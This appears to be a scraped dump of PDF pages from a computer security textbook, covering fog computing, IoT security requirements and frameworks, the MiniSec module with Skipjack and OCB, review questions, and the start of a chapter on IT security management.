       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 470, 'page_label': '469'}, page_content='13.4 / THE INTERNET OF THINGS  469\\nand higher-level processing. Processing elements at these levels may deal with \\nhigh volumes of data and perform data transformation operations, resulting in \\nthe storage of much lower volumes of data. The following are examples of fog \\ncomputing operations:\\n• Evaluation: Evaluating data for criteria as to whether it should be processed \\nat a higher level.\\n• Formatting: Reformatting data for consistent higher-level processing.\\n• Expanding/decoding: Handling cryptic data with additional context (such as  \\nthe origin).\\n• Distillation/reduction:  Reducing and/or summarizing data to minimize the \\nimpact of data and traffic on the network and higher-level processing systems.\\n• Assessment: Determining whether data r epresent a threshold or alert; this \\ncould include redirecting data to additional destinations.\\nGenerally, fog computing devices are deployed physically near the edge of the \\nIoT network; that is, near the sensors and other data-generating devices. Thus, some \\nof the basic processing of large volumes of generated data is offloaded and out -\\nsourced from IoT application software located at the center of the network.\\nFog computing and fog services are becoming a distinguishing characteris -\\ntic of the IoT. Fog computing represents an opposite trend in modern network -\\ning from cloud computing. With cloud computing, massive, centralized storage \\nand processing resources are made available to distributed customers over cloud \\nnetworking facilities to a relatively small number of users. With fog computing, \\nmassive numbers of individual smart objects are interconnected with fog net -\\nworking facilities that provide processing and storage resources close to the edge \\ndevices in an IoT. Fog computing addresses the challenges raised by the activ -\\nity of thousand or millions of smart devices, including security, privacy, network \\ncapacity constraints, and latency requirements. The term fog computing  is inspired \\nby the fact that fog tends to hover low to the ground, whereas clouds are high in  \\nthe sky.\\ncore The core network, also referred to as a backbone network , connects geo -\\ngraphically dispersed fog networks as well as provides access to other networks \\nthat are not part of the enterprise network. Typically, the core network will use \\nvery high performance routers, high-capacity transmission lines, and multiple \\ninterconnected routers for increased redundancy and capacity. The core network \\nmay also connect to high-performance, high-capacity servers, such as large data -\\nbase servers and private cloud facilities. Some of the core routers may be purely \\ninternal, providing redundancy and additional capacity without serving as edge \\nrouters.\\ncloud The cloud network provides storage and processing capabilities for the mas-\\nsive amounts of aggr egated data that originate in IoT-enabled devices at the\\xa0edge. \\nCloud servers also host the applications that (1) interact with and manage the IoT \\ndevices, and (2) analyze the IoT-generated data. Table 13.4 compares cloud and fog \\ncomputing.\\nM13_STAL0611_04_GE_C13.indd   469 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 471, 'page_label': '470'}, page_content='470  CHAPTER 13 / CLOUD AND IoT SECURITY\\n 13.5 IOT SECURITY\\nIoT is perhaps the most complex and undeveloped area of network security. To \\nsee this, consider Figure 13.10, which shows the main elements of interest for IoT \\nsecurity. At the center of the network are the application platforms, data stor -\\nage servers, and network and security management systems. These central systems \\ngather data from sensors, send control signals to actuators, and are responsible \\nfor managing the IoT devices and their communication networks. At the edge of \\nthe network are IoT-enabled devices, some of which are quite simple constrained \\ndevices, and some of which are more intelligent unconstrained devices. As well, \\ngateways may perform protocol conversion and other networking service on behalf \\nof IoT devices.\\nFigure 13.10 illustrates a number of typical scenarios for interconnection and \\nthe inclusion of security features. The shading in Figure 13.10 indicates the systems \\nthat support at least some of these functions. Typically, gateways will implement \\nsecure functions, such as TLS and IPsec. Unconstrained devices may or may not \\nimplement some security capability. Constrained devices generally have limited or no \\nsecurity features. As suggested in the figure, gateway devices can provide secure com-\\nmunication between the gateway and the devices at the center, such as application \\nplatforms and management platforms. However, any constrained or unconstrained \\ndevices attached to the gateway are outside the zone of security established between \\nthe gateway and the central systems. As shown, unconstrained devices can commu-\\nnicate directly with the center and support security functions. However, constrained \\ndevices that are not connected to gateways have no secure communications with \\ncentral devices.\\nCloud Fog\\nLocation of processing/storage \\nresources\\nCenter Edge\\nLatency High Low\\nAccess Fixed or wireless Mainly wireless\\nSupport for mobility Not applicable Yes\\nControl Centralized/hierarchical  \\n(full control)\\nDistributed/hierarchical  \\n(partial control)\\nService access Through core At the edge/on handheld device\\nAvailability 99.99% Highly volatile/highly redundant\\nNumber of users/devices Tens/hundreds of millions Tens of billions\\nMain content generator Human Devices/sensors\\nContent generation Central location Anywhere\\nContent consumption End device Anywhere\\nSoftware virtual infrastructure Central enterprise servers User devices\\nTable 13.4 Comparison of Cloud and Fog Features\\nM13_STAL0611_04_GE_C13.indd   470 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 472, 'page_label': '471'}, page_content='13.5 / IoT SECURITY  471\\nFigure 13.10 IoT Security: Elements of Interest\\nA\\nInternet\\nor\\nEnterprise Network\\nG\\nG\\nG\\n= application,\\nmanagement, or\\nstorage platform\\n= gateway\\n= unconstrained\\ndevice\\n= constrained\\ndevice\\nshading = includes security features\\nC\\nCCC\\nC\\nC\\nC\\nC\\nU\\nU\\nU\\nU\\nU\\nU\\nU\\nU\\nA\\nA\\nThe Patching Vulnerability\\nIn an often-quoted 2014 article, security expert Bruce Schneier stated that we are at \\na crisis point with regard to the security of embedded systems, including IoT devices \\n[SCHN14]. The embedded devices are riddled with vulnerabilities and there is no \\ngood way to patch them. The chip manufacturers have strong incentives to produce \\ntheir product with its firmware and software as quickly and cheaply as possible. The \\ndevice manufacturers choose a chip based on price and features and do very little \\nif anything to the chip software and firmware. Their focus is the functionality of  \\nthe device itself. The end user may have no means of patching the system or, if so, little \\ninformation about when and how to patch. The result is that the hundreds of millions \\nof Internet-connected devices in the IoT are vulnerable to attack. This is certainly a \\nproblem with sensors, allowing attackers to insert false data into the network. It is \\npotentially a graver threat with actuators, where the attacker can affect the operation \\nof machinery and other devices.\\nIoT Security and Privacy Requirements Defined by ITU-T\\nITU-T Recommendation Y.2066 (Common Requirements of the Internet of Things , \\nJune 2014) includes a list of security requirements for the IoT. This list is a use -\\nful baseline for understanding the scope of security implementation needed for an \\nIoT deployment. The requirements are defined as being the functional requirements \\nM13_STAL0611_04_GE_C13.indd   471 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 473, 'page_label': '472'}, page_content='472  CHAPTER 13 / CLOUD AND IoT SECURITY\\nduring capturing, storing, transferring, aggregating, and processing the data of things, \\nas well as to the provision of services which involve things. These requirements are \\nrelated to all the IoT actors. The requirements are the following:\\n• Communication security:  Secure, trusted, and privacy protected communica -\\ntion capability is required, so unauthorized access to the content of data can be \\nprohibited, integrity of data can be guaranteed and privacy-related content of \\ndata can be protected during data transmission or transfer in IoT.\\n• Data management security: Secure, trusted, and privacy protected data manage-\\nment capability is required, so unauthorized access to the content of data can \\nbe prohibited, integrity of data can be guaranteed, and privacy-related content \\nof data can be protected when storing or processing data in IoT.\\n• Service provision security: Secure, trusted, and privacy protected service provi-\\nsion capability is required, so unauthorized access to service and fraudulent \\nservice provision can be prohibited and privacy information related to IoT users \\ncan be protected.\\n• Integration of security policies and techniques: The ability to integrate different \\nsecurity policies and techniques is required, so as to ensure a consistent security \\ncontrol over the variety of devices and user networks in IoT.\\n• Mutual authentication and authorization: Before a device (or an IoT user) can \\naccess the IoT, mutual authentication and authorization between the device \\n(or the IoT user) and IoT is required to be performed according to predefined \\nsecurity policies.\\n• Security audit:  Security audit is required to be supported in IoT. Any data \\naccess or attempt to access IoT applications are required to be fully transpar -\\nent, traceable and reproducible according to appropriate regulation and laws. \\nIn particular, IoT is required to support security audit for data transmission, \\nstorage, processing, and application access.\\nA key element in providing security in an IoT deployment is the gateway. ITU-T \\nRecommendation Y.2067 (Common Requirements and Capabilities of a Gateway for \\nInternet of Things Applications , June 2014) details specific security functions that \\nthe gateway should implement, some of which are illustrated in Figure 13.11. These \\nconsist of the following:\\n• Support identification of each access to the connected devices.\\n• Support authentication with devices.  Based on application requirements and \\ndevice capabilities, it is required to support mutual or one-way authentication \\nwith devices. With one-way authentication, either the device authenticates itself \\nto the gateway or the gateway authenticates itself to the device, but not both.\\n• Support mutual authentication with applications.\\n• Support the security of the data that are stored in devices and the gateway, \\nor transferred between the gateway and devices, or transferred between the \\ngateway and applications. Support the security of these data based on security \\nlevels.\\n• Support mechanisms to protect privacy for devices and the gateway.\\nM13_STAL0611_04_GE_C13.indd   472 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 474, 'page_label': '473'}, page_content='13.5 / IoT SECURITY  473\\nFigure 13.11 IoT Gateway Security Functions\\nDevices\\nGateways\\nInternet or\\nenterprise\\nnetwork\\nApplication\\nplatforms\\nAuthentication\\nsecure data transfer\\nSecurity, privacy\\nof data at rest\\nAuthentication\\nsecure data transfer\\n• Support self-diagnosis and self-repair as well as remote maintenance.\\n• Support firmware and software update.\\n• Support auto configuration or configur ation by applications. The gateway is \\nrequired to support multiple configuration modes, for example, remote and \\nlocal configuration, automatic and manual configuration, and dynamic configu-\\nration based on policies.\\nSome of these requirements may be difficult to achieve when they involve pro-\\nviding security services for constrained devices. For example, the gateway should \\nsupport security of data stored in devices. Without encryption capability at the con-\\nstrained device, this may be impractical to achieve.\\nNote the Y.2067 requirements make a number of references to privacy require-\\nments. Privacy is an area of growing concern with the widespread deployment of \\nIoT-enabled things in homes, retail outlets, and vehicles and humans. As more things \\nare interconnected, governments and private enterprises will collect massive amounts \\nof data about individuals, including medical information, location and movement \\ninformation, and application usage.\\nM13_STAL0611_04_GE_C13.indd   473 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 475, 'page_label': '474'}, page_content='474  CHAPTER 13 / CLOUD AND IoT SECURITY\\nAn IoT Security Framework\\nCisco has developed a framework for IoT security [FRAH15] that serves as a use -\\nful guide to the security requirements for IoT. Figure 13.12 illustrates the security \\nenvironment related to the logical structure of an IoT. The IoT model is a simplified \\nversion of the World Forum IoT Reference Model. It consists of the following levels:\\n• Smart objects/embedded systems: Consists of sensors, actuators, and other embed-\\nded systems at the edge of the network. This is the most vulnerable part of an \\nIoT. The devices may not be in a physically secure environment and may need to \\nfunction for years. Availability is certainly an issue. Network managers also need \\nto be concerned about the authenticity and integrity of the data generated by \\nsensors and about protecting actuators and other smart devices from unauthor-\\nized use. Privacy and protection from eavesdropping may also be requirements.\\n• Fog/edge network: This level is concerned with the wired and wireless inter -\\nconnection of IoT devices. In addition, a certain amount of data processing \\nand consolidation may be done at this level. A key issue of concern is the wide \\nvariety of network technologies and protocols used by the various IoT devices \\nand the need to develop and enforce a uniform security policy.\\n• Core network: The core network level provides data paths between network \\ncenter platforms and the IoT devices. The security issues here are those con -\\nfronted in traditional core networks. However, the vast number of endpoints to \\ninteract with and manage creates a substantial security burden.\\n• Data center/cloud: This level contains the application, data storage, and net -\\nwork management platforms. IoT does not introduce any new security issues at \\nthis level, other than the necessity of dealing with huge numbers of individual \\nendpoints.\\nWithin this four-level architecture, the Cisco model defines four general security \\ncapabilities that span multiple levels:\\n• Role-based security:  RBAC systems assign access rights to roles instead of \\nindividual users. In turn, users are assigned to different roles, either statically \\nFigure 13.12 IoT Security Environment\\nData Center/\\nCloud\\nCore\\nNetwork\\nFog\\nNetwork\\nSmart\\nObjects\\nData Center/\\nCloud\\nCore\\nNetwork\\nFog\\nNetwork\\nSmart\\nObjects\\nRole-based Security\\nData Protection & Conﬁdentiality\\nIP Protection\\nAnti-tamper and Detection\\nM13_STAL0611_04_GE_C13.indd   474 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 476, 'page_label': '475'}, page_content='13.5 / IoT SECURITY  475\\nor dynamically, according to their responsibilities. RBAC enjoys widespread \\ncommercial use in cloud and enterprise systems and is a well-understood tool \\nthat can be used to manage access to IoT devices and the data they generate.\\n• Anti-tamper and detection: This function is particularly important at the device \\nand fog network levels but also extends to the core network level. All of these \\nlevels may involve components that are physically outside the area of the enter-\\nprise that is protected by physical security measures.\\n• Data protection and confidentiality: These functions extend to all level of the \\narchitecture.\\n• Internet protocol protection: Protection of data in motion from eavesdropping \\nand snooping is essential between all levels.\\nFigure 13.12 maps specific security functional areas across the four layers of \\nthe IoT model. [FRAH15] also proposes a secure IoT framework that defines the \\ncomponents of a security facility for an IoT that encompasses all the levels, as shown \\nin Figure 13.13. The four components are:\\n• Authentication: Encompasses the elements that initiate the determination of \\naccess by first identifying the IoT devices. In contrast to typical enterprise net-\\nwork devices, which may be identified by a human credential (e.g., username \\nand password or token), the IoT endpoints must be fingerprinted by means \\nthat do not require human interaction. Such identifiers include RFID, x.509 \\ncertificates, or the MAC address of the endpoint.\\n• Authorization: Controls a device’s access throughout the network fabric. This \\nelement encompasses access control. Together with the authentication layer, \\nit establishes the necessary parameters to enable the exchange of information \\nFigure 13.13 Secure IoT Framework\\nNetwork Enforced Policy\\nSecure Analytics: Visibility and Control\\nAuthorization\\nAuthentication\\nTrust Relationship\\nM13_STAL0611_04_GE_C13.indd   475 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 477, 'page_label': '476'}, page_content='476  CHAPTER 13 / CLOUD AND IoT SECURITY\\nbetween devices and between devices and application platforms and enables \\nIoT-related services to be performed.\\n• Network enforced policy: Encompasses all elements that route and transport \\nendpoint traffic securely over the infrastructure, whether control, management, \\nor actual data traffic.\\n• Secure analytics, including visibility and control: This component includes all the \\nfunctions required for central management of IoT devices. This involves, firstly, \\nvisibility of IoT devices, which simply means that central management services \\nare securely aware of the distributed IoT device collection, including identity \\nand attributes of each device. Building on this visibility is the ability to exert \\ncontrol, including configuration, patch updates, and threat countermeasures.\\nAn important concept related to this framework is that of trust relationship. In \\nthis context, trust relationship refers to the ability of the two partners to an exchange to \\nhave confidence in the identity and access rights of the other. The authentication com-\\nponent of the trust framework provides a basic level of trust, which is expanded with the \\nauthorization component. [FRAH15] gives the example that a car may establish a trust \\nrelationship with another car from the same vendor. That trust relationship, however, \\nmay only allow cars to exchange their safety capabilities. When a trusted relationship \\nis established between the same car and its dealer’s network, the car may be allowed to \\nshare additional information such as its odometer reading and last maintenance record.\\nAn Open-source IoT Security Module\\nThis section provides an overview of MiniSec, an open-source security module that is \\npart of the TinyOS operating system. TinyOS is designed for small embedded systems \\nwith tight requirements on memory, processing time, real-time response, and power \\nconsumption. TinyOS takes the process of streamlining quite far, resulting in a very \\nminimal OS for embedded systems, with a typical configuration requiring 48 KB \\nof code and 10 KB of RAM [LEVI12]. The main application of TinyOS is wireless \\nsensor networks, and it has become the de facto OS for such networks. With sensor \\nnetworks the primary security concerns relate to wireless communications. MiniSec \\nis designed to be a link-level module that offers a high level of security, while simul-\\ntaneously keeping energy consumption low and using very little memory [LUK07]. \\nMiniSec provides confidentiality, authentication, and replay protection.\\nMiniSec has two operating modes, one tailored for single-source communica -\\ntion, and another tailored for multi-source broadcast communication. The latter does \\nnot require per-sender state for replay protection and thus scales to large networks.\\nMiniSec is designed to meet the following requirements:\\n• Data authentication:  Enables a legitimate node to verify whether a message \\noriginated from another legitimate node (i.e., a node with which it shares a \\nsecret key) and was unchanged during transmission.\\n• Confidentiality: A basic requirement for any secure communications system.\\n• Replay protection: Prevents an attacker from successfully recording a packet \\nand replaying it at a later time.\\n• Freshness: Because sensor nodes often stream time-varying measurements, \\nproviding guarantee of message freshness is an important property. There are \\nM13_STAL0611_04_GE_C13.indd   476 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 478, 'page_label': '477'}, page_content='13.5 / IoT SECURITY  477\\ntwo types of freshness: Strong and weak. MiniSec provides a mechanism to \\nguarantee weak freshness, where a receiver can determine a partial ordering \\nover received messages without a local reference time point.\\n• Low energy overhead: This is achieved by minimizing communication overhead \\nand by using only symmetric encryption.\\n• Resilient to lost messages: The relatively high occurrence of dropped packets \\nin wireless sensor networks requires a design that can tolerate high message \\nloss rates.\\ncryPtograPHic algoritHmS Two cryptographic algorithms used by MiniSec are \\nworth noting. The first of these is the encryption algorithm Skipjack. Skipjack was \\ndeveloped in the 1990s by the U.S. National Security Agency (NSA). It is one of \\nthe simplest and fastest block cipher algorithms, which is critical to embedded sys -\\ntems. A study of eight possible candidate algorithms for wireless security networks \\n[LAW06] concluded that Skipjack was the best algorithm in terms of code memory, \\ndata memory, encryption/decryption efficiency, and key setup efficiency.\\nSkipjack makes use of an 80-bit key. It was intended by NSA to provide a secure \\nsystem once it became clear that DES, with only a 56-bit key, was vulnerable. Contem-\\nporary algorithms, such as AES, employ a key length of at least 128 bits, and 80 bits \\nis generally considered inadequate. However, for the limited application of wireless \\nsensor networks and other IoT devices, which provide large volumes of short data \\nblocks over a slow data link, Skipjack suffices. With its efficient computation and low \\nmemory footprint, Skipjack is an attractive choice for IoT devices.\\nThe block cipher mode of operation chosen for MiniSec is the Offset Codebook \\n(OCB) mode. As mentioned in Chapter 2, a mode of operation must be specified \\nwhen a plaintext source consists of multiple blocks of data to be encrypted with the \\nsame encryption key. OCB mode is provably secure assuming the underlying block \\ncipher is secure. OCB mode is a one-pass mode of operation making it highly effi -\\ncient. Only one block cipher call is necessary for each plaintext block, (with an addi-\\ntional two calls needed to complete the whole encryption process). OCB is especially \\nwell suited for the stringent energy constraints of sensor nodes.\\nA feature that contributes significantly to the efficiency of OCB is that with \\none pass through the sequence of plaintext blocks, it produces a ciphertext of equal \\nlength and a tag for authentication. To decrypt a ciphertext, the receiver performs \\nthe reverse process to recover the plaintext. Then, the receiver ensures that the tag is \\nas expected. If the receiver computes a different tag than the one accompanying the \\nciphertext, the ciphertext is considered to be invalid. Thus, both message authentica-\\ntion and message confidentiality are achieved with a single, simple algorithm. OCB \\nwill be described in Chapter 21.\\nMiniSec employs per-device keys; that is, each key is unique to a particular pair \\nof devices to prevent replay attacks.\\noPerating modeS MiniSec has two operating modes:  Unicast (MiniSec-U) and \\nbroadcast (MiniSec-B). Both schemes use OCB with a counter, known as a nonce, \\nthat is input along with the plaintext into the encryption algorithm. The least sig -\\nnificant bits of the counter are also sent as plaintext to enable synchronization. For \\nboth modes, data are transmitted in packets. Each packet includes the encrypted data \\nblock, the OCB authentication tag, and the MiniSec counter.\\nM13_STAL0611_04_GE_C13.indd   477 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 479, 'page_label': '478'}, page_content='478  CHAPTER 13 / CLOUD AND IoT SECURITY\\nMiniSec-U employs synchronized counters, which require the receiver to keep \\na local counter for each sender. The strictly monotonically increasing counter guar-\\nantees semantic confidentiality. 1 Even if the sender A repeatedly sends the same \\nmessage, each ciphertext is different because a different counter value is used. In \\naddition, once a receiver observes a counter value, it rejects packets with an equal \\nor smaller counter value. Therefore, an attacker cannot replay any packet that the \\nreceiver has previously received. If a number of packets are dropped, the sender and \\nreceiver engage in a resynchronization protocol.\\nMiniSec-U cannot be directly used to secure broadcast communication. First, \\nit would be too expensive to run the counter resynchronization protocol among \\nmany receivers. In addition, if a node was to simultaneously receive packets from a \\nlarge group of sending nodes, it would need to maintain a counter for each sender, \\nresulting in high memory overhead. Instead, it uses two mechanisms, a timing-based \\napproach and a bloom-filter approach, that defend against replay attacks. First, the \\ntime is divided into t-length epochs E1,E2,.... Using the current epoch or the previ-\\nous epoch as nonce for OCB encryption, the replay of messages from older epochs \\nis avoided. The timing approach is augmented with a bloom-filter approach in order \\nto prevent replay attacks inside the current epoch. MiniSec-B uses as nonce element \\nin OCB encryption and bloom-filter key the string nodeID.Ei.Cab, where nodeID \\nis the sender node identifier, Ei is the current epoch, and Cab is a shared counter. \\nEvery time that a node receives a message, it checks if it belongs to its bloom filter. \\nIf the message is not replayed, it is stored in the bloom filter. Else, the node drops it.\\nFor further details on the two operating modes, see [TOBA07].\\n 13.6 KEY TERMS AND REVIEW QUESTIONS\\n1Semantic confidentiality means that if the same plaintext is encrypted twice, the two resulting ciphertexts \\nare different.\\nKey Terms\\nactuator\\nbackbone network\\ncloud auditor\\ncloud broker\\ncloud carrier\\ncloud computing\\ncloud service consumer (CSC)\\ncloud service provider (CSP)\\ncommunity cloud\\ncore\\ndata loss prevention (DLP)\\nedge\\nfog\\nhybrid cloud\\nidentity and access \\n management (IAM)\\ninfrastructure as a service \\n(IaaS)\\nInternet of things (IoT)\\nintrusion management\\nmicrocontroller\\nMiniSec\\nmulti-instance model\\nmulti-tenant model\\nOpenStack\\npatching vulnerability\\nplatform as a service (PaaS)\\nprivate cloud\\npublic cloud\\nradio-frequency identification \\n(RFID)\\nsecurity as a service (SecaaS)\\nsecurity assessments\\nsecurity information and event \\nmanagement (SIEM)\\nsensor\\nservice arbitrage\\nservice aggregation\\nservice intermediation\\nsoftware as a service (SaaS)\\ntransceiver\\nM13_STAL0611_04_GE_C13.indd   478 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 480, 'page_label': '479'}, page_content='13.6 / KEY TERMS AND REVIEW QUESTIONS  479\\nReview Questions\\n 13.1 List five essential characteristics of cloud computing.\\n 13.2 List and briefly define three cloud service models.\\n 13.3 Briefly explain the most prominent deployment models for cloud computing.\\n 13.4 Describe some of the main cloud-specific security threats.\\n 13.5 What is OpenStack?\\n 13.6 Define the Internet of things.\\n 13.7 List any five security recommendations included in the ITU-T recommendation.\\n 13.8 Define the patching vulnerability.\\n 13.9 What is the IoT security framework?\\n 13.10 What are some of the key features of the Skipjack encryption algorithm?\\nM13_STAL0611_04_GE_C13.indd   479 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 481, 'page_label': '480'}, page_content='IT Security Management \\nand\\xa0Risk Assessment\\nCHAPTER \\nPart three:  Management Issues\\n14.1 IT Security Management\\n14.2 Organizational Context and Security Policy\\n14.3 Security Risk Assessment\\nBaseline Approach\\nInformal Approach\\nDetailed Risk Analysis\\nCombined Approach\\n14.4 Detailed Security Risk Analysis\\nContext and System Characterization\\nIdentification of Threats/Risks/Vulnerabilities\\nAnalyze Risks\\nEvaluate Risks\\nRisk Treatment\\n14.5 Case Study: Silver Star Mines\\n14.6 Key Terms, Review Questions, and Problems\\n480\\nM14_STAL0611_04_GE_C14.indd   480 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 482, 'page_label': '481'}, page_content='14.1 / IT SECURITY MANAGEMENT  481\\nIn previous chapters, we discussed a range of technical and administrative  measures that \\ncan be used to manage and improve the security of computer systems and  networks. In \\nthis chapter and the next, we will look at the process of how to best select and imple-\\nment these measures to effectively address an organization’s security requirements. As \\nwe noted in Chapter 1, this involves examining three fundamental questions:\\n1. What assets do we need to protect?\\n2. How are those assets threatened?\\n3. What can we do to counter those threats?\\nIT security management is the formal process of answering these questions, ensuring \\nthat critical assets are sufficiently protected in a cost-effective manner. More specifi-\\ncally, IT security management consists of first determining a clear view of an organiza-\\ntion’s IT security objectives and general risk profile. Next, an IT security risk assessment \\nis needed for each asset in the organization that requires protection; this assessment \\nmust answer the three key questions listed above. It provides the information necessary \\nto decide what management, operational, and technical controls are needed to either \\nreduce the risks identified to an acceptable level or otherwise accept the resultant \\nrisk. This chapter will consider each of these items. The process continues by selecting \\nsuitable controls then writing plans and procedures to ensure these necessary controls \\nare implemented effectively. That implementation must be monitored to determine if \\nthe security objectives are met. The whole process must be iterated, and the plans and \\nprocedures kept up-to-date, because of the rapid rate of change in both the technology \\nand the risk environment. We will discuss the latter part of this process in Chapter\\xa015. \\nThe following chapters, then, will address specific control areas relating to physical \\nsecurity in Chapter 16, human factors in Chapter 17 , and auditing in Chapter 18.\\n 14.1 IT SECURITY MANAGEMENT\\nThe discipline of IT security management has evolved considerably over the last few \\ndecades. This has occurred in response to the rapid growth of, and dependence on, \\nnetworked computer systems, and the associated rise in risks to these systems. In the \\nlast decade, a number of national and international standards have been  published. \\nThese represent a consensus on the best practice  in the field. The International \\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Understand the process involved in IT security management.\\n ◆ Describe an organization’s IT security objectives, strategies, and policies.\\n ◆ Detail some alternative approaches to IT security risk assessment.\\n ◆ Detail steps required in a formal IT security risk assessment.\\n ◆ Characterize identified threats and consequences to determine risk.\\n ◆ Detail risk treatment alternatives.\\nM14_STAL0611_04_GE_C14.indd   481 10/11/17   3:09 PM'),\n",
